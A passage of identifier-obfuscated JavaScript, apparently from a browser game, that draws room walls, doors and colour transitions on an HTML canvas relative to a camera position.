			var ⵠⵠΔⲆΔ = Math.max(ᐃᐃΔ.ⲆΔΔ.y + ⵠⵠᐃᐃΔ, ᐃΔΔ);
			var ΔⲆⲆᐃΔ = Math.max(-ᐃᐃΔ.ⲆΔΔ.y + ⵠⲆᐃⲆ - ⲆΔⲆΔⲆᐃᐃ - ⵠᐃᐃᐃᐃΔⵠ, ⵠᐃⲆᐃ);
			var ⵠⲆⲆⲆ = ⵠⵠΔⲆΔ;
			var ᐃᐃⵠᐃΔ = ⵠⲆᐃⲆ - ⵠⵠΔⲆΔ - ΔⲆⲆᐃΔ;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w1).x;
			else var ⵠᐃᐃᐃΔ = w1.r.x;
			var Δⵠⵠᐃ = ⵠⲆⲆΔ + ΔᐃᐃΔ.ᐃⲆᐃΔΔ;
			var ⵠΔᐃᐃᐃ = Δⵠⵠᐃ,
				ΔᐃΔΔⲆ = ⵠⲆⲆⲆ,
				ΔΔⵠΔⵠ = ⵠᐃᐃᐃΔ + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ,
				ᐃΔΔΔᐃ = ᐃᐃⵠᐃΔ;
			Δⵠⵠᐃ += ⵠᐃᐃᐃΔ + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ - 2;
			var ⲆΔΔᐃⲆ = Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w2).x;
			else var ⵠᐃᐃᐃΔ = w2.r.x;
			var d2 = ⵠⲆⲆΔ + ΔᐃᐃΔ.ⵠⵠᐃⲆΔ - Δⵠⵠᐃ + ⵠᐃᐃᐃΔ;
			var ⲆᐃᐃⲆⲆ = Δⵠⵠᐃ,
				ΔΔᐃⵠΔ = ⵠⲆⲆⲆ,
				ᐃⲆⲆⵠⲆ = d2,
				ⲆⲆᐃⲆᐃ = ᐃᐃⵠᐃΔ;
			Δⵠⵠᐃ += d2 - ⲆⵠΔΔ;
			var ⲆⵠⵠⵠΔ = Δⵠⵠᐃ - 2;
			if (ᐃΔⲆᐃ) var ⵠᐃᐃᐃΔ = ΔⵠⲆⵠ.ΔᐃⲆ(w3).x;
			else var ⵠᐃᐃᐃΔ = w3.r.x;
			d2 = ⵠⲆⲆΔ + ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ - Δⵠⵠᐃ + ⵠᐃᐃᐃΔ;
			if (Δⵠⵠᐃ + d2 - ⲆᐃΔᐃ > ⲆⵠⵠⵠΔ) {
				var ΔΔⲆΔⵠ = ⲆᐃΔⲆⲆ;
				var ΔⲆΔΔⵠ = Δⵠⵠᐃ,
					ⲆΔⲆⲆⵠ = ⵠⲆⲆⲆ,
					ⵠⵠⵠⵠᐃ = d2,
					ΔⵠᐃΔΔ = ᐃᐃⵠᐃΔ;
				Δⵠⵠᐃ += d2 - 2;
				var ⵠᐃᐃⵠΔ = Δⵠⵠᐃ
			} else {
				var ΔΔⲆΔⵠ = ᐃⵠⵠᐃΔ;
				Δⵠⵠᐃ = ⲆⵠⵠⵠΔ;
				var ⵠᐃᐃⵠΔ = -1
			}
			d2 = ⵠⲆⲆΔ + ΔᐃᐃΔ.ΔΔᐃΔⲆᐃⵠ - Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ > Δᐃᐃⵠ && ⵠΔⵠΔ === ᐃⲆⲆⵠ.ᐃⵠⵠΔᐃⵠΔ) {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(15, 77, 72, 252, 239, 187, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⲆΔⵠⵠᐃᐃⵠ[ⲆⲆⲆ.time];
				Δ.fillRect(Δⵠⵠᐃ, ⵠⲆⲆⲆ, d2, ᐃᐃⵠᐃΔ)
			} else {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ΔΔΔ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(ᐃⲆⲆⵠ.ΔΔᐃ[0], ᐃⲆⲆⵠ.ΔΔᐃ[1], ᐃⲆⲆⵠ.ΔΔᐃ[2], ᐃⲆⲆⵠ.ᐃΔⲆ[0], ᐃⲆⲆⵠ.ᐃΔⲆ[ΔΔᐃⵠ], ᐃⲆⲆⵠ.ᐃΔⲆ[ᐃⲆΔⲆ], ᐃΔΔⵠ)
				} else Δ.fillStyle = ᐃⲆⲆⵠ.ⵠᐃᐃⵠⲆ[ⲆⲆⲆ.time];
				Δ.fillRect(Δⵠⵠᐃ, ⵠⲆⲆⲆ, d2, ᐃᐃⵠᐃΔ)
			}
		}

		function ⵠⵠᐃⲆ(ᐃⲆΔ, ᐃᐃⵠᐃⵠ, ⲆⵠᐃΔⵠ) {
			ⲆⲆⲆ.transition ? (Δ.globalAlpha = ⵠΔⵠΔ, ᐃⲆΔ.ΔᐃΔⵠ(ᐃᐃⵠᐃⵠ, ⲆⵠᐃΔⵠ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ⲆⲆⲆᐃ : 1, Δ.globalAlpha = ᐃΔᐃⲆ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ, ᐃⲆΔ.ΔᐃΔⵠ(ᐃᐃⵠᐃⵠ, ⲆⵠᐃΔⵠ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ΔᐃΔΔ : 1, Δ.globalAlpha = ΔΔᐃⵠ) : ᐃⲆΔ.ΔᐃΔⵠ(ᐃᐃⵠᐃⵠ, ⲆⵠᐃΔⵠ)
		}

		function ΔⵠᐃᐃⲆΔᐃ(ᐃⲆΔ, ⲆⲆᐃⲆ) {
			ⲆⲆⲆ.transition ? (Δ.globalAlpha = 1, ᐃⲆΔ.ᐃΔⵠᐃΔ(ⲆⲆᐃⲆ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ⲆⲆⲆᐃ : ⲆⵠⲆⲆ, Δ.globalAlpha = 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ, ᐃⲆΔ.ᐃΔⵠᐃΔ(ⲆⲆᐃⲆ), ⲆⲆⲆ.time = ⲆⲆⲆ.time ? ⵠᐃⲆᐃ : ΔⲆᐃᐃ, Δ.globalAlpha = ⵠΔⲆ) : ᐃⲆΔ.ᐃΔⵠᐃΔ(ⲆⲆᐃⲆ)
		}

		function ΔⵠᐃⲆᐃⲆⲆ(ⵠⵠᐃᐃΔ, ⵠⵠⲆᐃΔ, ⵠΔⲆΔⲆ, ΔⵠⲆⵠ, ᐃⲆⲆⵠ, ᐃΔⲆᐃ) {
			var w1 = ΔⵠⲆⵠ.w1;
			var w2 = ΔⵠⲆⵠ.w2;
			var w3 = ΔⵠⲆⵠ.w3;
			var ⵠⲆⲆⲆ = ᐃᐃΔ.ⲆΔΔ.y + ⵠⵠᐃᐃΔ + 710;
			var ⵠΔⵠΔⵠ = Math.max(ᐃᐃΔ.ⲆΔΔ.x + ⵠⵠⲆᐃΔ, Δᐃᐃⵠ);
			var ⲆⵠΔΔⲆ = Math.max(-ᐃᐃΔ.ⲆΔΔ.x + ΔΔΔᐃ - ⵠΔⲆΔⲆ - 100, ΔⲆⲆ);
			var ⵠⲆⲆΔ = ⵠΔⵠΔⵠ;
			var ᐃⵠΔᐃⲆ = ΔΔΔᐃ - ⵠΔⵠΔⵠ - ⲆⵠΔΔⲆ;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w1);
			else var ᐃⵠⵠ = w1.r;
			var Δⵠⵠᐃ = ⵠⲆⲆⲆ + ΔᐃᐃΔ.ᐃⲆᐃΔΔ;
			var ΔᐃΔΔⲆ = Δⵠⵠᐃ,
				ⵠΔᐃᐃᐃ = ⵠⲆⲆΔ,
				ᐃΔΔΔᐃ = -ᐃⵠⵠ.x + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ,
				ΔΔⵠΔⵠ = ᐃⵠΔᐃⲆ;
			Δⵠⵠᐃ += -ᐃⵠⵠ.x + ΔᐃᐃΔ.ΔⲆⵠᐃᐃ + ⵠⵠΔⲆ;
			var ⲆΔΔᐃⲆ = Δⵠⵠᐃ;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w2);
			else var ᐃⵠⵠ = w2.r;
			var d2 = ⵠⲆⲆⲆ - ΔᐃᐃΔ.ⵠⵠᐃⲆΔ - Δⵠⵠᐃ - ᐃⵠⵠ.x;
			var ΔΔᐃⵠΔ = Δⵠⵠᐃ,
				ⲆᐃᐃⲆⲆ = ⵠⲆⲆΔ,
				ⲆⲆᐃⲆᐃ = d2,
				ᐃⲆⲆⵠⲆ = ᐃⵠΔᐃⲆ;
			Δⵠⵠᐃ += d2 + ⲆᐃᐃⲆ;
			var ⲆⵠⵠⵠΔ = Δⵠⵠᐃ - 2;
			if (ᐃΔⲆᐃ) var ᐃⵠⵠ = ΔⵠⲆⵠ.ΔᐃⲆ(w3);
			else var ᐃⵠⵠ = w3.r;
			d2 = ⵠⲆⲆⲆ - ΔᐃᐃΔ.Ⲇⵠⵠᐃⵠ - Δⵠⵠᐃ - ᐃⵠⵠ.x;
			if (Δⵠⵠᐃ + d2 < ⲆⵠⵠⵠΔ) {
				var ΔΔⲆΔⵠ = true;
				var ⲆΔⲆⲆⵠ = Δⵠⵠᐃ,
					ΔⲆΔΔⵠ = ⵠⲆⲆΔ,
					ΔⵠᐃΔΔ = d2,
					ⵠⵠⵠⵠᐃ = ᐃⵠΔᐃⲆ;
				Δⵠⵠᐃ += d2 + Δⵠⵠⵠ;
				var ⵠᐃᐃⵠΔ = Δⵠⵠᐃ
			} else {
				var ΔΔⲆΔⵠ = ⲆᐃⵠⲆⵠ;
				Δⵠⵠᐃ = ⲆⵠⵠⵠΔ;
				var ⵠᐃᐃⵠΔ = -1
			}
			d2 = ⵠⲆⲆⲆ - ΔᐃᐃΔ.ΔΔᐃΔⲆᐃⵠ - Δⵠⵠᐃ;
			if (ⲆⲆⲆ.transition) {
				var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ᐃΔᐃⲆ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
				Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
			} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time];
			Δ.fillRect(ⵠΔᐃᐃᐃ, ΔᐃΔΔⲆ, ΔΔⵠΔⵠ, ᐃΔΔΔᐃ);
			if (ᐃΔⲆᐃ) {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ⲆⵠⲆⲆ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(15, 70, 76, 42, 139, 155, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⵠⲆΔΔᐃⵠⲆ[ⲆⲆⲆ.time]
			} else {
				if (ⲆⲆⲆ.transition) {
					var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
					Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
				} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time]
			}
			Δ.fillRect(ⲆᐃᐃⲆⲆ, ΔΔᐃⵠΔ, ᐃⲆⲆⵠⲆ, ⲆⲆᐃⲆᐃ);
			if (ΔΔⲆΔⵠ) {
				if (ᐃΔⲆᐃ) {
					if (ⲆⲆⲆ.transition) {
						var ᐃΔΔⵠ = ⲆⲆⲆ.time ? Ⲇᐃⵠ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
						Δ.fillStyle = ⲆΔⲆⲆⲆ(17, 94, 96, 169, 214, 211, ᐃΔΔⵠ)
					} else Δ.fillStyle = Ⲇ.ᐃⵠⵠⵠΔΔⵠ[ⲆⲆⲆ.time]
				} else {
					if (ⲆⲆⲆ.transition) {
						var ᐃΔΔⵠ = ⲆⲆⲆ.time ? 1 - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
						Δ.fillStyle = ⲆΔⲆⲆⲆ(9, 55, 63, 11, 106, 132, ᐃΔΔⵠ)
					} else Δ.fillStyle = Ⲇ.ⵠⵠᐃⵠⵠ[ⲆⲆⲆ.time]
				}
				Δ.fillRect(ΔⲆΔΔⵠ, ⲆΔⲆⲆⵠ, ⵠⵠⵠⵠᐃ, ΔⵠᐃΔΔ)
			}
			ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ && ᐃΔⲆᐃ && ΔⵠⲆⵠ.ⲆⵠⵠΔⵠᐃᐃᐃⵠ(ⲆⵠⵠⵠΔ, ⵠᐃᐃⵠΔ, ⲆΔΔᐃⲆ, ⵠⲆⲆⲆ, -ᐃᐃΔ.ⲆΔΔ.x + ⵠΔᐃᐃᐃ, -ᐃᐃΔ.ⲆΔΔ.x + ⵠΔᐃᐃᐃ + ΔΔⵠΔⵠ)
		}

		function ⵠⲆΔΔΔᐃΔ() {
			for (var ⵠᐃ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.length - 1; ⲆⲆⲆᐃ <= ⵠᐃ; ⵠᐃ--) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃ];
				if (ᐃⲆⲆⵠ.ΔᐃⲆ === ⲆⲆⲆ.ⵠᐃΔᐃⲆ) {
					var Ⲇⵠᐃ = ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ];
					if (ᐃⲆⲆⵠ.x1 - 230 - ΔΔΔᐃ <= -ᐃᐃΔ.ⲆΔΔ.x && ᐃⲆⲆⵠ.x2 + 330 >= -ᐃᐃΔ.ⲆΔΔ.x && -ᐃᐃΔ.ⲆΔΔ.y >= ᐃⲆⲆⵠ.y1 - ⵠⲆᐃⲆ && -ᐃᐃΔ.ⲆΔΔ.y <= ᐃⲆⲆⵠ.y2 + ᐃⲆΔⲆⵠ) {
						var ⵠⵠΔᐃ = ᐃⲆⲆⵠ.x2;
						if (ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ) ⵠⵠΔᐃ -= 610;
						var ⵠᐃⵠⵠ = ᐃⲆⲆⵠ.x1;
						if (ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ) ⵠᐃⵠⵠ += 610;
						var ΔᐃⵠⲆ = ᐃⲆⲆⵠ.y2;
						ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ && (ΔᐃⵠⲆ -= 610);
						var ᐃᐃⵠⲆ = ᐃⲆⲆⵠ.y1;
						ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ && (ᐃᐃⵠⲆ += 610);
						if (ⲆⲆⲆ.transition) {
							var ᐃΔΔⵠ = ⲆⲆⲆ.time ? ᐃⲆᐃ - ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ : ⲆⲆⲆ.ᐃΔΔⵠ.ΔᐃΔ;
							Δ.fillStyle = ⲆΔⲆⲆⲆ(Ⲇⵠᐃ.ΔΔᐃ[ⵠⲆⲆ], Ⲇⵠᐃ.ΔΔᐃ[1], Ⲇⵠᐃ.ΔΔᐃ[2], Ⲇⵠᐃ.ᐃΔⲆ[ⵠᐃⲆᐃ], Ⲇⵠᐃ.ᐃΔⲆ[1], Ⲇⵠᐃ.ᐃΔⲆ[1], ᐃΔΔⵠ)
						} else Δ.fillStyle = Ⲇⵠᐃ.ⵠᐃᐃⵠⲆ[ⲆⲆⲆ.time];
						var ⵠΔⵠΔⵠ = Math.max(ᐃᐃΔ.ⲆΔΔ.x + ⵠᐃⵠⵠ - 2 - 230, 0);
						var ⲆⵠΔΔⲆ = Math.max(-ᐃᐃΔ.ⲆΔΔ.x + ΔΔΔᐃ - ⵠⵠΔᐃ - 330 - 2, ΔᐃΔΔ);
						var ⵠⵠΔⲆΔ = Math.max(ᐃᐃΔ.ⲆΔΔ.y + ᐃᐃⵠⲆ - 2, ΔᐃΔΔ);
						var ΔⲆⲆᐃΔ = Math.max(-ᐃᐃΔ.ⲆΔΔ.y + ⵠⲆᐃⲆ - ΔᐃⵠⲆ - 100 - ᐃⵠⲆⲆⲆ, 0);
						Δ.beginPath();
						Δ.fillRect(ⵠΔⵠΔⵠ, ⵠⵠΔⲆΔ, ΔΔΔᐃ - ⲆⵠΔΔⲆ - ⵠΔⵠΔⵠ, ⵠⲆᐃⲆ - ⵠⵠΔⲆΔ - ΔⲆⲆᐃΔ)
					}
				}
			}
			for (var ⵠᐃ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.length - ΔⵠⲆΔ; ΔⲆⲆ <= ⵠᐃ; ⵠᐃ--) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃ];
				if (ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ) {
					var ⵠⵠΔᐃ = ᐃⲆⲆⵠ.x2;
					ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ && (ⵠⵠΔᐃ -= 400);
					var ⵠᐃⵠⵠ = ᐃⲆⲆⵠ.x1;
					if (ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ) ⵠᐃⵠⵠ += 400;
					var ΔᐃⵠⲆ = ᐃⲆⲆⵠ.y2;
					if (ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ) ΔᐃⵠⲆ -= 300;
					var ᐃᐃⵠⲆ = ᐃⲆⲆⵠ.y1;
					if (ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ) ᐃᐃⵠⲆ += 300;
					0 === (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃᐃΔᐃ) && ⵠⵠΔᐃ - ΔΔΔᐃ + 120 <= -ᐃᐃΔ.ⲆΔΔ.x && -ᐃᐃΔ.ⲆΔΔ.x <= ⵠⵠΔᐃ + 820 && -ᐃᐃΔ.ⲆΔΔ.y >= ᐃᐃⵠⲆ + 88 - ⵠⲆᐃⲆ && -ᐃᐃΔ.ⲆΔΔ.y <= ΔᐃⵠⲆ + 50 && (ⲆᐃᐃⲆⵠΔⵠ(ⵠⵠΔᐃ, ᐃᐃⵠⲆ + 88, ΔᐃⵠⲆ - 88, ᐃᐃΔ.ΔⵠⲆⵠ[ᐃⵠⲆⵠ], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃᐃΔᐃ), ΔⲆⲆᐃⵠΔⵠ(ⵠⵠΔᐃ, ᐃᐃⵠⲆ + 88, ΔᐃⵠⲆ - 88, ᐃᐃΔ.ΔⵠⲆⵠ[0], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃᐃΔᐃ));
					0 === (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃΔΔᐃ) && ⵠᐃⵠⵠ - ΔΔΔᐃ - 700 <= -ᐃᐃΔ.ⲆΔΔ.x && -ᐃᐃΔ.ⲆΔΔ.x <= ⵠᐃⵠⵠ - ⵠⵠΔΔᐃ && ᐃᐃⵠⲆ + 88 - ⵠⲆᐃⲆ <= -ᐃᐃΔ.ⲆΔΔ.y && -ᐃᐃΔ.ⲆΔΔ.y <= ΔᐃⵠⲆ + 50 && (ᐃⵠⵠᐃᐃᐃΔ(ⵠᐃⵠⵠ, ᐃᐃⵠⲆ + 88, ΔᐃⵠⲆ - 88, ᐃᐃΔ.ΔⵠⲆⵠ[ⵠⲆΔ], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃΔΔᐃ), ΔⲆⲆⵠΔⲆⲆ(ⵠᐃⵠⵠ, ᐃᐃⵠⲆ + 88, ΔᐃⵠⲆ - 88, ᐃᐃΔ.ΔⵠⲆⵠ[1], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃΔΔᐃ));
					(ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ᐃΔᐃᐃⲆ) === 0 && -ᐃᐃΔ.ⲆΔΔ.x >= ⵠᐃⵠⵠ - 235 - ΔΔΔᐃ && -ᐃᐃΔ.ⲆΔΔ.x <= ⵠⵠΔᐃ + 350 && -ᐃᐃΔ.ⲆΔΔ.y >= ΔᐃⵠⲆ - ⵠⲆᐃⲆ - 275 && ΔᐃⵠⲆ + 490 >= -ᐃᐃΔ.ⲆΔΔ.y && (ⲆΔⵠΔⵠⵠΔ(ΔᐃⵠⲆ - 230, ⵠᐃⵠⵠ - 230, ⵠⵠΔᐃ + 230, ᐃᐃΔ.ΔⵠⲆⵠ[ⵠⵠΔⲆ], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ᐃΔᐃᐃⲆ), ΔⵠᐃⲆᐃⲆⲆ(ΔᐃⵠⲆ - 230, ⵠᐃⵠⵠ - 230, ⵠⵠΔᐃ + 230, ᐃᐃΔ.ΔⵠⲆⵠ[2], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ᐃΔᐃᐃⲆ));
					if ((ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⵠⲆⲆⵠΔ) === 0 && ⵠᐃⵠⵠ - 235 - ΔΔΔᐃ <= -ᐃᐃΔ.ⲆΔΔ.x && ⵠⵠΔᐃ + 350 >= -ᐃᐃΔ.ⲆΔΔ.x && -ᐃᐃΔ.ⲆΔΔ.y >= ᐃᐃⵠⲆ - ⵠⲆᐃⲆ - 390 && -ᐃᐃΔ.ⲆΔΔ.y <= ᐃᐃⵠⲆ + 315) {
						ΔⲆⵠⲆᐃᐃᐃ(ᐃᐃⵠⲆ + 310, ⵠᐃⵠⵠ - 230, ⵠⵠΔᐃ + 230, ᐃᐃΔ.ΔⵠⲆⵠ[ⵠⵠⵠⵠ], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⵠⲆⲆⵠΔ);
						ⲆᐃⲆΔΔᐃᐃ(ᐃᐃⵠⲆ + 310, ⵠᐃⵠⵠ - 230, ⵠⵠΔᐃ + 230, ᐃᐃΔ.ΔⵠⲆⵠ[ΔᐃⲆΔ], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⵠⲆⲆⵠΔ)
					}
				}
			}
			for (var ⵠᐃ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ.length - 1; 0 <= ⵠᐃ; ⵠᐃ--) {
				var ᐃⲆⲆⵠ = ⲆⲆⲆ.ᐃⵠⵠⵠⵠ[ⵠᐃ];
				if (ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ) {
					var ⵠⵠΔᐃ = ᐃⲆⲆⵠ.x2;
					ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ && (ⵠⵠΔᐃ -= 400);
					var ⵠᐃⵠⵠ = ᐃⲆⲆⵠ.x1;
					ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ && (ⵠᐃⵠⵠ += 400);
					var ΔᐃⵠⲆ = ᐃⲆⲆⵠ.y2;
					ⲆⲆⲆ.ⵠᐃΔᐃⲆ !== ᐃⲆⲆⵠ.ΔᐃⲆ && (ΔᐃⵠⲆ -= 300);
					var ᐃᐃⵠⲆ = ᐃⲆⲆⵠ.y1;
					if (ᐃⲆⲆⵠ.ΔᐃⲆ !== ⲆⲆⲆ.ⵠᐃΔᐃⲆ) ᐃᐃⵠⲆ += 300;
					(ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃᐃΔᐃ) !== ᐃⵠⲆ && ⵠⵠΔᐃ - ΔΔΔᐃ + 120 <= -ᐃᐃΔ.ⲆΔΔ.x && -ᐃᐃΔ.ⲆΔΔ.x <= ⵠⵠΔᐃ + 820 && -ᐃᐃΔ.ⲆΔΔ.y >= ᐃᐃⵠⲆ + 88 - ⵠⲆᐃⲆ && ΔᐃⵠⲆ + 50 >= -ᐃᐃΔ.ⲆΔΔ.y && ⲆᐃᐃⲆⵠΔⵠ(ⵠⵠΔᐃ, ᐃᐃⵠⲆ + 88, ΔᐃⵠⲆ - 88, ᐃᐃΔ.ΔⵠⲆⵠ[ᐃⵠΔ], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃᐃΔᐃ);
					if (0 !== (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃΔΔᐃ) && -ᐃᐃΔ.ⲆΔΔ.x >= ⵠᐃⵠⵠ - ΔΔΔᐃ - 700 && -ᐃᐃΔ.ⲆΔΔ.x <= ⵠᐃⵠⵠ - ᐃΔⲆⵠᐃ && -ᐃᐃΔ.ⲆΔΔ.y >= ᐃᐃⵠⲆ + 88 - ⵠⲆᐃⲆ && -ᐃᐃΔ.ⲆΔΔ.y <= ΔᐃⵠⲆ + 50) {
						ᐃⵠⵠᐃᐃᐃΔ(ⵠᐃⵠⵠ, ᐃᐃⵠⲆ + 88, ΔᐃⵠⲆ - 88, ᐃᐃΔ.ΔⵠⲆⵠ[1], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ⲆᐃΔΔᐃ)
					}
					if (ⲆΔⵠ !== (ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ᐃΔᐃᐃⲆ) && ⵠᐃⵠⵠ - 235 - ΔΔΔᐃ <= -ᐃᐃΔ.ⲆΔΔ.x && -ᐃᐃΔ.ⲆΔΔ.x <= ⵠⵠΔᐃ + 350 && -ᐃᐃΔ.ⲆΔΔ.y >= ΔᐃⵠⲆ - ⵠⲆᐃⲆ - 275 && -ᐃᐃΔ.ⲆΔΔ.y <= ΔᐃⵠⲆ + 490) {
						ⲆΔⵠΔⵠⵠΔ(ΔᐃⵠⲆ - 230, ⵠᐃⵠⵠ - 230, ⵠⵠΔᐃ + 230, ᐃᐃΔ.ΔⵠⲆⵠ[ⲆᐃᐃⲆ], ⲆⲆⲆ.ΔⲆⵠⵠΔ[ᐃⲆⲆⵠ.ΔᐃⲆ], ᐃⲆⲆⵠ.ΔᐃΔ & ΔᐃᐃΔ.ᐃΔᐃᐃⲆ)
